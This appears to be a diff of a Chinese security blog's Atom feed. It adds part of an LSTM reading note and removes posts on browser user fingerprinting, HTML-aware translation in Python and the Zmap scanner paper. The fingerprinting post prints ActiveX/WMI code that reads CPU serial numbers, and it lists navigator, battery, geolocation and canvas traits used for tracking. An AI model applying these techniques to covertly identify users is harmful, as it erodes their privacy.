+&lt;p&gt;长短时记忆结构由一组可重复连接的子网组成，称为记忆块。这些块可以看成是计算机中内存芯片的一个细微版本。每个块包含一个或者多个自连接的内存单元和三个乘法单元，分别在输入、输出和遗忘门的地方，它们为每个神经元提供了连续读、写和重置操作。长短时记忆与标准循环神经网络类似，只是隐藏层中的求和单元被记忆块替代。记忆块也可以和求和单元混用，尽管通常不这样做。而它们两者的输出层都是相同的。乘法门允许长短时记忆单元长时间的存储和访问信息，从而减轻梯度消失问题。比如，只要输入门保持关闭，神经元的激活就不会被新输入覆盖，因此，当打开输出门时，之前的状态就可以被用于之后的网络中。通过这一机制对梯度信息进行保护。&lt;/p&gt;
+&lt;p&gt;在过去的十年中，长短时记忆在一系列需要长范围记忆的任务中被证明是成功的，包括上下文无关的语言学习、扩展噪声序列中的召回高精度实数以及要求精确计时和计数的任务。特别是在解决其他循环神经网络所无法解决的问题上。&lt;/p&gt;
+&lt;p&gt;长短时记忆已经被应用在许多真实问题中，包括蛋白质二级预测、音乐生成、强化学习、语音识别和手写体识别。正如预期的那样，它的优势就在于解决对长程上下文依赖的问题。&lt;/p&gt;
+&lt;h2 id=&quot;0x02-预处理带来的影响&quot;&gt;&lt;a href=&quot;#0x02-预处理带来的影响&quot; class=&quot;headerlink&quot; title=&quot;0x02 预处理带来的影响&quot;&gt;&lt;/a&gt;0x02 预处理带来的影响&lt;/h2&gt;&lt;p&gt;以上的讨论抛出了一个对预处理影响而言重要的观点，如果我们能够将包含长程上下文依赖的任务转换为只包含短期依赖的任务，我们就不需要LSTM了。例如，一个原始的语音信号通常有40千赫左右的采样率。很明显，当对这个语音进行标记或者建模时，我们需要用很长的时间步长来进行序列学习。然而，当信号先转换成100赫兹的频率倒谱系统时，利用上下文范围相对较短的算法对数据进行处理就是可行的，比如隐马尔科夫模型。&lt;/p&gt;
+&lt;p&gt;尽管预处理会带来这样的好处，但是如果这种转换是困难的或者是未知的，又或者我们只是单纯的希望不去设计预处理而得到较好的结果时，我们就需要能够处理长程依赖的算法。&lt;/p&gt;
+&lt;h2 id=&quot;0x03-梯度计算&quot;&gt;&lt;a href=&quot;#0x03-梯度计算&quot; class=&quot;headerlink&quot; title=&quot;0x03 梯度计算&quot;&gt;&lt;/a&gt;0x03 梯度计算&lt;/h2&gt;&lt;p&gt;就像上一章所讨论过的网络一样，LSTM是一个可微的函数近似器，通常用梯度下降来训练。当然，近几年还有人进行非梯度的LSTM训练方法研究。&lt;/p&gt;
+&lt;p&gt;最初的LSTM训练算法采用一种近似误差梯度，同时结合了实时循环学习和反向传播。反向转播部分在一个时间步长后被截断，这里的长程依赖将由内存块处理，而不是通过原来连接的激活节点。截断梯度的好处是使算法完全在线，在每一个时间步长后都可以进行权重更新。这对于连续控制或者时间序列预测来说是一个重要的属性。&lt;/p&gt;
+&lt;p&gt;当然，也可以用未截断的反向传播来精确计算LSTM的梯度。除了准确的特点外，这种梯度计算还有易于调优的优点，因为它可以用之前提到的技术进行数值检查。&lt;/p&gt;
+&lt;h2 id=&quot;0x04-构架变体&quot;&gt;&lt;a href=&quot;#0x04-构架变体&quot; class=&quot;headerlink&quot; title=&quot;0x04 构架变体&quot;&gt;&lt;/a&gt;0x04 构架变体&lt;/h2&gt;&lt;p&gt;原始的LSTM只包含输入门和输出门。而在拓展LSTM中，加入了连接到记忆单元的遗忘门和附加的窥孔权重。遗忘门的目的是为记忆单元提供一种重置的方法，对于那些需要遗忘输入的任务很重要。与此同时，窥孔连接提高了LSTM的学习能力，这些任务需要精确的时间和内部状态计数。&lt;/p&gt;
+&lt;p&gt;由于LSTM完全由简单的乘法和加法单元组成以及它们之间的连接构成，因此可以直接通过创建块结构来进一步改变LSTM。事实上，它已经证明了在玩具问题上具有同样良好的效果，比如上下文自由的学习和上下文敏感的语言可以自动演变。&lt;/p&gt;
+&lt;h2 id=&quot;0x05-双向长短期记忆&quot;&gt;&lt;a href=&quot;#0x05-双向长短期记忆&quot; class=&quot;headerlink&quot; title=&quot;0x05 双向长短期记忆&quot;&gt;&lt;/a&gt;0x05 双向长短期记忆&lt;/h2&gt;&lt;p&gt;利用LSTM作为双向循环神经网络结构，双向LSTM在两个输入方向上提供了对远程上下文的访问，后面会继续讨论。&lt;/p&gt;
+&lt;h2 id=&quot;0x06-网络方程&quot;&gt;&lt;a href=&quot;#0x06-网络方程&quot; class=&quot;headerlink&quot; title=&quot;0x06 网络方程&quot;&gt;&lt;/a&gt;0x06 网络方程&lt;/h2&gt;&lt;p&gt;这一节提供了在一个循环神经网络中一个LSTM隐藏层激活和反向梯度计算的方程。&lt;/p&gt;
+&lt;p&gt;和之前一样，我们有权重连接表示、网络输入单元、时间单位以及时间单位输入带来的表示、时间单位上的激活单元。LSTM方程仅仅提供一个单一记忆单元。对于多个块，简单的进行依次重复计算。只是在权重值上，我们多了遗忘门权重以及窥孔权重。其他参数还有激活函数、神经元状态的激活线性单元。&lt;/p&gt;
+&lt;p&gt;注意，我们附加的这些单元只在神经元的内部可见，与标准循环神经网网络不同的是，一个LSTM层包含更多的输入，但只有神经元产生可见的输出给网络的其余部分。&lt;/p&gt;
+&lt;p&gt;和标准循环神经网络相似，它的前向计算是循环的更新长度序列，反向传播通过时间倒序递减计算单位导数。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;负责的项目代码初版7月18日全部完成了，有时间继续补坑。然而之后又是出差，所以这篇一直拖到了8月14日才完成~&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="读书笔记" scheme="http://phantom0301.cc/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="机器学习" scheme="http://phantom0301.cc/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
+    
+      <category term="神经网络" scheme="http://phantom0301.cc/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
+    
+      <category term="读书笔记" scheme="http://phantom0301.cc/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>基于递归神经网络的监督序列标记（2）</title>
@@ -1305,587 +1875,6 @@ check(&amp;apos;123QWEqwe&amp;apos;, &amp;apos;gktqer4zml32472wmht9xeuixvg5pvjd&
       <category term="CVE" scheme="http://phantom0301.cc/tags/CVE/"/>
     
       <category term="swf" scheme="http://phantom0301.cc/tags/swf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>前端用户指纹识别实践</title>
-    <link href="http://phantom0301.cc/2016/12/08/jsuser/"/>
-    <id>http://phantom0301.cc/2016/12/08/jsuser/</id>
-    <published>2016-12-08T11:47:31.000Z</published>
-    <updated>2016-12-09T01:58:25.813Z</updated>
-    
-    <content type="html">&lt;p&gt;声明：郑重声明我不会在自己的博客页面里嵌入这里提到的任何代码。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&quot;0x01-突破与困境&quot;&gt;&lt;a href=&quot;#0x01-突破与困境&quot; class=&quot;headerlink&quot; title=&quot;0x01 突破与困境&quot;&gt;&lt;/a&gt;0x01 突破与困境&lt;/h2&gt;&lt;p&gt;在之前的博客里提到，曾经的那个网页和浏览器都很单纯的年代，网站服务端们靠着bling、bling的五颜六色的文字吸引着浏览器们的眼球，一切都是那么的相安无事，岁月静好。&lt;/p&gt;
-&lt;p&gt;可是，蜜月不长，浏览器们就学会了提交一些不正常的数据给服务端，来让服务端出错。&lt;/p&gt;
-&lt;p&gt;又过了一段时间，浏览器们需要服务端不断地视觉刺激，于是服务端们在原本单一的HTML排版中加入了动态语言来实现更多的逻辑，然而这远远满足不了上帝的口味，接下来，CSS/JS/HTML5等提供更强大视觉效果和交互功能的体系被用在前端的展示中。&lt;/p&gt;
-&lt;p&gt;能力越大，责任越大，功能强劲的函数被编写支持，它的能力所带来的反噬效果也就越强大。原本用来突破性能瓶颈，优化用户体验的功能恰恰也带来了前端安全的困境。&lt;/p&gt;
-&lt;h2 id=&quot;0x02-体验与隐私&quot;&gt;&lt;a href=&quot;#0x02-体验与隐私&quot; class=&quot;headerlink&quot; title=&quot;0x02 体验与隐私&quot;&gt;&lt;/a&gt;0x02 体验与隐私&lt;/h2&gt;&lt;p&gt;想要更好的体验吗？用你的隐私来交换吧~&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;1.ActiveXObject对象，被禁断的危险。&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;ActiveX 是一套广泛用于提供视频、动画内容的控件。它是微软的一个扩展，由于显而易见的危险，它只在IE中被支持，并且默认都是关闭的。即便你强行打开它的效果，现在的windows也会一直提醒你“赶快关上，没什么好用的”。总之，它是已经被封印了的及其危险的家伙，让我们一窥它的效果。&lt;br&gt;逻辑代码如下：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;var locator = new ActiveXObject (&amp;quot;WbemScripting.SWbemLocator&amp;quot;); 
-var service = locator.ConnectServer(&amp;quot;.&amp;quot;); 
-var properties = service.ExecQuery(&amp;quot;SELECT * FROM Win32_Processor&amp;quot;);  
-info+=&amp;quot;&amp;lt;tr  bgcolor=&amp;apos;#CDEDED&amp;apos; style=&amp;apos;font-weight: bold;&amp;apos; &amp;gt;&amp;lt;td width=&amp;apos;450&amp;apos; &amp;gt;CPU 信息&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
-for (;!e.atEnd();e.moveNext ()) {   
-    var p = e.item ();   
-    info+=&amp;quot;&amp;lt;tr style=&amp;apos;color: red&amp;apos;&amp;gt;&amp;lt;td &amp;gt;CPU序列号:&amp;quot; + p.ProcessorID + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
-    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;&amp;quot;+p.Caption+&amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
-    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;CPU编号：&amp;quot;+p.DeviceID+&amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
-    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;CPU型号：&amp;quot; + p.Name + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
-    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;CPU状态：&amp;quot; + p.CpuStatus + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
-    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;CPU可用性：&amp;quot; + p.Availability + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
-    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;CUP Level：&amp;quot; + p.Level + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
-    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;主机名称：&amp;quot; + p.SystemName + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
-    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;Processor Type：&amp;quot; + p.ProcessorType + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;; 
-}
-return info;
-}
-fnShowPrcName(&amp;quot;Win32_StartupCommand&amp;quot;);
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;效果如下：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20161208204109.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;如上所示，这种方式可以获取系统级的信息&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;2.navigator组函数，技能各异的兄弟。&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Navigator对象包含了有关浏览器的信息，不同浏览器对它的支持各不相同，那么首先通过调用函数的回显就可以判断不同的浏览器了，主要在Firefox下对这一对象的方法进行了测试，以下函数都可以作为用户身份的一个分析维度。&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;appCodeName，浏览器代码名————“Mozilla”&lt;/p&gt;
-&lt;p&gt;appName，浏览器名————“Netscape”&lt;/p&gt;
-&lt;p&gt;appVersion，浏览器版本————“5.0 (Windows)”&lt;/p&gt;
-&lt;p&gt;languages，浏览器语言————[“zh-CN”, “zh”, “en-US”, “en”]&lt;/p&gt;
-&lt;p&gt;oscpu，系统CPU————“Windows NT 10.0; WOW64”&lt;/p&gt;
-&lt;p&gt;userAgent，不用多说&lt;/p&gt;
-&lt;p&gt;plugins[]，浏览器安装插件&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;这里首先要说一下这一个参数，通过获取浏览器安装的插件，其实我们就可以判断出一部分用户所安装过的应用，尤其是杀毒软件、社交软件、支付软件等往往会安装相应的浏览器插件，那么通过这些信息的获取，就可以作为用户异度的另一个参数。&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;getBattery()，当前电池参数&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;这是我想说的另一个点，我们知道如果使用移动设备访问网站，那么一方面不同用户访问时的电池状态会存在差异性，另一方面在短时间内，同一用户的电池状态存在一定稳定性，甚至是一个连贯的变化过程，那么通过获取电池状态信息就可以辅助我们判断用户身份。&lt;/p&gt;
-&lt;p&gt;一个简单的脑洞就是，构建相应的电池信息三元组，通过计算欧几里得距离来构建相关性图景。&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;geolocation，地理位置获取&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;这个需要用户在浏览器同意定位，在没有一个完整的IP地理库时，这也是一种画像手段。&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;more&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;除了以上列举出的部分函数外，一些基于移动设备的调用在某些特殊应用场合也可以来对用户身份进行识别。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;3.Canvas,你的个性绘图函数。&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Cookie追踪手段是众所周知的用户画像手法，而另一种被广泛提到且有效的手段就是Canvas绘图指纹。&lt;/p&gt;
-&lt;p&gt;Canvas作为HTML5中重要的绘图手段，被证实在绘制图形时，不同机器的不同浏览器对函数的实现都有略微的差别，而这种差异就可以很好的作为用户标记的手段。&lt;/p&gt;
-&lt;p&gt;具体来龙去脉这篇文章讲的很清楚，而且已经有现成的JS实现，这里就不在多说。&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/miyeah/p/3967494.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/miyeah/p/3967494.html&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&quot;0x03-小DEMO&quot;&gt;&lt;a href=&quot;#0x03-小DEMO&quot; class=&quot;headerlink&quot; title=&quot;0x03 小DEMO&quot;&gt;&lt;/a&gt;0x03 小DEMO&lt;/h2&gt;&lt;p&gt;如果希望测试我上面提到的各种好玩的信息获取，可以访问以下地址：&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://123.207.68.169/test.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;A little demo&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;不过，请注意，访问之前请充分考虑您对于隐私的顾虑，我能够做的保证是：&lt;/p&gt;
-&lt;p&gt;一、不在我博客的网页中使用相应代码；&lt;/p&gt;
-&lt;p&gt;二、demo中只是把信息回显到您的浏览器，不做任何信息收集保留；&lt;/p&gt;
-&lt;p&gt;三、为了不被他人利用，DEMO中的代码经过了混淆。&lt;/p&gt;
-</content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;声明：郑重声明我不会在自己的博客页面里嵌入这里提到的任何代码。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Javascript" scheme="http://phantom0301.cc/categories/Javascript/"/>
-    
-    
-      <category term="html5" scheme="http://phantom0301.cc/tags/html5/"/>
-    
-      <category term="javascript" scheme="http://phantom0301.cc/tags/javascript/"/>
-    
-      <category term="身份识别" scheme="http://phantom0301.cc/tags/%E8%BA%AB%E4%BB%BD%E8%AF%86%E5%88%AB/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Python实现网页解析翻译</title>
-    <link href="http://phantom0301.cc/2016/12/02/htmlparser/"/>
-    <id>http://phantom0301.cc/2016/12/02/htmlparser/</id>
-    <published>2016-12-02T10:32:34.000Z</published>
-    <updated>2016-12-08T06:12:06.851Z</updated>
-    
-    <content type="html">&lt;p&gt;先不说主流的几款提供翻译接口的产品在翻译的水准上如何，就HTML标签识别来说，度娘恐怕没有谷歌和必应做的好。&lt;/p&gt;
-&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
-&lt;h2 id=&quot;0x01-需求&quot;&gt;&lt;a href=&quot;#0x01-需求&quot; class=&quot;headerlink&quot; title=&quot;0x01 需求&quot;&gt;&lt;/a&gt;0x01 需求&lt;/h2&gt;&lt;p&gt;最近需要写程序翻译一批英文网页，要求翻译后的网页排版样式基本不变。经过前期测试发现，Google和Bing的在线翻译可以直接识别出HTML的标签：&lt;/p&gt;
-&lt;p&gt;类似这样，看起来很舒心~~：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/qweasdwfdeqw20161202201213.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;换做度娘，Oh~：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/rhsrthser20161202201502.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;本以为是因为度娘没有做网页翻译插件的打算，所以没这个功能，但是查证后发现——其实百度是支持网页翻译的——也就是理论上应该可以识别网页标签，也许是我的姿势不对  (O.O)_?  求证大家的操作心得。&lt;/p&gt;
-&lt;p&gt;总之，在正常的百度翻译API调用下无法实现很好的解析翻译网页，而能够实现这一功能的另两位也有客观上的难度，Google就不用说了，如果要调用就需要在程序上挂一个代理；那么，Bing这厮呢？要申请它的API过程太繁琐，一是大陆这边好像这项服务选项为空，另外通过其他手段拿到的好像也是试用key。最终，决定自己写个中间件，处理标签后送入百度，拿到翻译结果再重组标签。&lt;/p&gt;
-&lt;h2 id=&quot;0x02-框架&quot;&gt;&lt;a href=&quot;#0x02-框架&quot; class=&quot;headerlink&quot; title=&quot;0x02 框架&quot;&gt;&lt;/a&gt;0x02 框架&lt;/h2&gt;&lt;p&gt;决定自己写处理程序后面临两种选择，一种是一个网页每对闭合标签调用一次API，另一种是一个网页一次性全部翻译后再分割。&lt;/p&gt;
-&lt;p&gt;两种方法的不同之处在于，前者实现简单，但是每个网页多次调用API增加时间开销且浪费API调用次数，所以使用第二种方式实现。&lt;/p&gt;
-&lt;p&gt;预期结构如下：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;读取网页 ——&amp;gt; 剔除标签，生成文本&amp;amp;标签数组 ——&amp;gt; 数组文本翻译
-                                             |
-                                            \ /
-翻译完成  &amp;lt;—— 标签数组，文本数组组合  &amp;lt;—— 结果重分割数组
-&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;
-&lt;li&gt;剔除标签，生成文本标签数组。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Python下有很多好用的HTML解析包，例如BS4，lxml，xpath等等，但是它们的封装都很高级，这里我只需要最简单的识别出标签和文本，所以使用代码更简单的HTMLParser来实现。&lt;/p&gt;
-&lt;p&gt;HTMLParser是一个基于正则匹配的解析包，它写好了HTML的正则规则，提供了一个类给使用者继承，个人觉得包本身的核心是它的 &lt;em&gt;goahead&lt;/em&gt; 函数，利用这种步步识别的方法来解析HTML。&lt;/p&gt;
-&lt;p&gt;继承的类中，重写了如下方法：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;def handle_starttag(self, tag, attrs):
-    attr = &amp;apos;&amp;apos;
-    for i in attrs:
-        attr = i[0]+&amp;apos;=&amp;apos;+i[1]  # 恢复标签属性值
-    if attr == &amp;apos;&amp;apos;:
-        self.parser_dic.append(&amp;apos;&amp;lt;&amp;apos;+tag+&amp;apos;&amp;gt;&amp;apos;)
-    else:
-        self.parser_dic.append(&amp;apos;&amp;lt;&amp;apos;+tag+&amp;apos; &amp;apos;+attr+&amp;apos;&amp;gt;&amp;apos;)
-def handle_endtag(self, tag):
-    self.parser_dic.append(&amp;apos;&amp;lt;/&amp;apos;+tag+&amp;apos;&amp;gt;&amp;apos;)
-def handle_startendtag(self, tag, attrs):
-    attr = &amp;apos;&amp;apos;
-    for i in attrs:
-        attr = i[0]+&amp;apos;=&amp;apos;+&amp;apos;&amp;quot;&amp;apos;+i[1]+&amp;apos;&amp;quot;&amp;apos;
-    if attr == &amp;apos;&amp;apos;:
-        self.parser_dic.append(&amp;apos;&amp;lt;&amp;apos;+tag+&amp;apos;&amp;gt;&amp;apos;)
-    else:
-        self.parser_dic.append(&amp;apos;&amp;lt;&amp;apos;+tag+&amp;apos; &amp;apos;+attr+&amp;apos;&amp;gt;&amp;apos;)
-def handle_data(self, data):
-    self.parser_dic.append(data)
-def handle_comment(self, data):
-    self.parser_dic.append(&amp;apos;&amp;lt;!-- --&amp;gt;&amp;apos;)
-def handle_entityref(self, name):
-    self.parser_dic.append(&amp;apos;&amp;amp;&amp;apos;+name+&amp;apos;;&amp;apos;)
-def handle_charref(self, name):
-    self.parser_dic.append(&amp;apos;&amp;amp;#&amp;apos;+name+&amp;apos;;&amp;apos;)
-def output(self):
-    return self.parser_dic
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过调用父类中的 &lt;em&gt;feed&lt;/em&gt; 方法来解析网页，解析结果输出成为一个按照顺序排列的标签和文本混合的数组。&lt;/p&gt;
-&lt;p&gt;遍历数组，提取文本数组，遍历文本数组，添加分割符，组合成一个含有分隔符的文本。&lt;/p&gt;
-&lt;p&gt;混合数组如下：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/dhdjdtj20161202211106.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;添加分割符如下：&lt;br&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20161202212045.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;2.数组翻译&lt;/p&gt;
-&lt;p&gt;直接将含有分隔符的文本按照百度API调用规则发送，这个不需要多说。&lt;/p&gt;
-&lt;p&gt;3.结果重分割&lt;/p&gt;
-&lt;p&gt;使用文本自带的 &lt;em&gt;split&lt;/em&gt; 或者正则的对应函数分割之前的分隔符，形成文本数组&lt;/p&gt;
-&lt;p&gt;4.标签重组&lt;/p&gt;
-&lt;p&gt;这一部分就是重新遍历之前的标签文本混合数组，遇见非标签的内容，就用翻译后的文本数组替换，这样依次替换完成就可以实现保留标签的文本翻译。&lt;/p&gt;
-&lt;h2 id=&quot;0x03-问题&quot;&gt;&lt;a href=&quot;#0x03-问题&quot; class=&quot;headerlink&quot; title=&quot;0x03 问题&quot;&gt;&lt;/a&gt;0x03 问题&lt;/h2&gt;&lt;p&gt;实际操作绝大多数情况下是可行的。&lt;/p&gt;
-&lt;p&gt;但是也有些问题，一是百度API一次翻译的字数有限，这就意味着，还需要做文本分割，而分割时又要考虑标签的完整性。二是分割符的选择，分隔符有时候也会引起翻译结果的混乱，初步测试使用“|”相对效果较好，后期可能使用多个分割符来防止分割符和文本本身符号混淆。&lt;/p&gt;
-&lt;p&gt;最后放一张整个完成后的翻译效果图&lt;br&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20161202213133.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-</content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;先不说主流的几款提供翻译接口的产品在翻译的水准上如何，就HTML标签识别来说，度娘恐怕没有谷歌和必应做的好。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="python" scheme="http://phantom0301.cc/categories/python/"/>
-    
-    
-      <category term="htmlparser" scheme="http://phantom0301.cc/tags/htmlparser/"/>
-    
-      <category term="python" scheme="http://phantom0301.cc/tags/python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Zmap论文简读</title>
-    <link href="http://phantom0301.cc/2016/10/27/Zmapread/"/>
-    <id>http://phantom0301.cc/2016/10/27/Zmapread/</id>
-    <published>2016-10-27T03:00:29.000Z</published>
-    <updated>2016-10-27T03:36:19.940Z</updated>
-    
-    <content type="html">&lt;p&gt;很早之前就读到过其他大大使用Zmap做测试的文章，自己也玩了一下这个快速的扫描工具，但是一直对于它的认识处在黑盒的状态，所以这次浏览了一遍Zmap的论文，对于论文里面提到的点进行记录。&lt;/p&gt;
-&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
-&lt;h2 id=&quot;0x01-诞生&quot;&gt;&lt;a href=&quot;#0x01-诞生&quot; class=&quot;headerlink&quot; title=&quot;0x01 诞生&quot;&gt;&lt;/a&gt;0x01 诞生&lt;/h2&gt;&lt;p&gt;一直以来，丈量日渐庞大的互联网就是研究者们的探索方向之一，和攻击者使用的探测手法，比如僵尸网络或者蠕虫相比，研究者能够利用的方法十分有限，于是，Zmap诞生了。&lt;/p&gt;
-&lt;p&gt;在此之前，除了每一位致力于此的研究者自己编写的程序外，最有效的工具应该是Nmap，这已经是十分优秀的探测工具，但是它还是不够快，如果打算利用Nmap去扫描整个网络空间，花费的时间单位将以天计。&lt;/p&gt;
-&lt;h2 id=&quot;0x02-性能&quot;&gt;&lt;a href=&quot;#0x02-性能&quot; class=&quot;headerlink&quot; title=&quot;0x02 性能&quot;&gt;&lt;/a&gt;0x02 性能&lt;/h2&gt;&lt;p&gt;官方给出的性能版本是：单台入门级服务器在千兆以太网速度下扫描整个IPv4空间需要45分钟。&lt;/p&gt;
-&lt;p&gt;在同等准确度的限制下，它是使用agressive default策略的Nmap扫描速度的1300倍。&lt;/p&gt;
-&lt;p&gt;Zmap能够将当前带宽的利用率提升到97%&lt;/p&gt;
-&lt;h2 id=&quot;0x03-优化&quot;&gt;&lt;a href=&quot;#0x03-优化&quot; class=&quot;headerlink&quot; title=&quot;0x03 优化&quot;&gt;&lt;/a&gt;0x03 优化&lt;/h2&gt;&lt;p&gt;为了提高扫描速度，Zmap采用以下策略进行扫描探测优化：&lt;/p&gt;
-&lt;p&gt;首先，Zmap跳过TCP/IP堆栈，直接在链路层使用以太网帧；&lt;br&gt;其次，对于目标列表的选取使用随机抽样，这样避免顺序扫描导致的对方网络负载过大。通过采用乘法循环群随机序列来保证生成稠密且唯一的随机数；&lt;br&gt;使用类似SYN cookies的方式来避免存储包交互时的序列状态确认；&lt;br&gt;使用根树，一种处理范围和使用频率的路由表来排除特殊的地址空间；&lt;br&gt;最后，在扫描过程中，允许丢失少量的扫描数据。&lt;/p&gt;
-&lt;h2 id=&quot;0x04-验证&quot;&gt;&lt;a href=&quot;#0x04-验证&quot; class=&quot;headerlink&quot; title=&quot;0x04 验证&quot;&gt;&lt;/a&gt;0x04 验证&lt;/h2&gt;&lt;p&gt;通过实验对比，Zmap的命中率与扫描速度无关，同时对于探测的覆盖率和扫描时刻的影响进行的比较。&lt;/p&gt;
-&lt;p&gt;在和Nmap的比较中我们可以看出，Nmap更适合单目标多端口的探测，而Zmap则侧重于多目标单端口的扫描环境。&lt;/p&gt;
-&lt;h2 id=&quot;0x05-实际部署&quot;&gt;&lt;a href=&quot;#0x05-实际部署&quot; class=&quot;headerlink&quot; title=&quot;0x05 实际部署&quot;&gt;&lt;/a&gt;0x05 实际部署&lt;/h2&gt;&lt;p&gt;如果你是出于善意的角度使用Zmap去测量网络空间，在使用工具时，应该注意以下几点：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;保持与网络管理员的联系，注意Zmap对当前的网络带宽环境带来的影响。&lt;/li&gt;
-&lt;li&gt;在机器的源地址上放一个简单的网页声明，对于扫描源IP进行DNS解析，方便其他机构辨识。&lt;/li&gt;
-&lt;li&gt;适当减缓扫描速度，使用灵活的扫描策略，降低可能的影响。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id=&quot;0x06-发展&quot;&gt;&lt;a href=&quot;#0x06-发展&quot; class=&quot;headerlink&quot; title=&quot;0x06 发展&quot;&gt;&lt;/a&gt;0x06 发展&lt;/h2&gt;&lt;p&gt;这是论文里提到的未来Zmap的发展之路，不过这篇论文已经是3年前的了，其中提到的一些设想说不定已经实现。&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;IPv6空间扫描&lt;/li&gt;
-&lt;li&gt;单IP多域名多证书扫描&lt;/li&gt;
-&lt;li&gt;类似robot的扫描圈君子协定&lt;/li&gt;
-&lt;li&gt;更快的速度，甚至于实现建立某一时刻的网络地址空间快照&lt;/li&gt;
-&lt;/ol&gt;
-</content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;很早之前就读到过其他大大使用Zmap做测试的文章，自己也玩了一下这个快速的扫描工具，但是一直对于它的认识处在黑盒的状态，所以这次浏览了一遍Zmap的论文，对于论文里面提到的点进行记录。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="工具" scheme="http://phantom0301.cc/categories/%E5%B7%A5%E5%85%B7/"/>
-    
-    
-      <category term="Zmap" scheme="http://phantom0301.cc/tags/Zmap/"/>
-    
